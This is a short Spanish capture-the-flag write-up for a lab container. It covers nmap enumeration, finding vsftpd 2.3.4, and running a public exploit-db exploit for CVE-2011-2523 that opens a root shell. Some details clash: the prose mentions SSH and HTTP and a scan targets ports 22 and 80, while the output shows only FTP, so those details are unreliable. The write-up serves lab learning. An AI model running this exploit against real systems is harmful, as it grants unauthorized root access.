#ftp #command-execution

![](../../../Images/Pasted%20image%2020241008071742.png)
# Enumeración

## Nmap

El escaneo de **nmap** nos enseña la existencia de un servicio **SSH** i un servicio **HTTP** funcionando.

```
> nmap --open --min-rate 10000 -Pn -n -oN scans/allTCPPorts $target

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 15:44 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000013s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
```

```
> nmap -oN scans/targetedTCPPorts -sCV $target -p 22,80                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 15:44 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000045s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.85 seconds
```

## FTP (21 TCP Port)

Enumerando el servicio **FTP** nos encontramos con una versión que tiene la vulnerabilidad [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) que permite la ejecución de comandos.

Descargando el siguiente [exploit](https://www.exploit-db.com/exploits/49757) conseguimos acceso al sistema objetivo directamente con permisos de administrador.

```
> python3 49757 172.17.0.2

/home/rh4ps00dy/Downloads/firsthacking/49757:11: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  from telnetlib import Telnet
Success, shell opened
Send `exit` to quit shell
id
uid=0(root) gid=0(root) groups=0(root)
```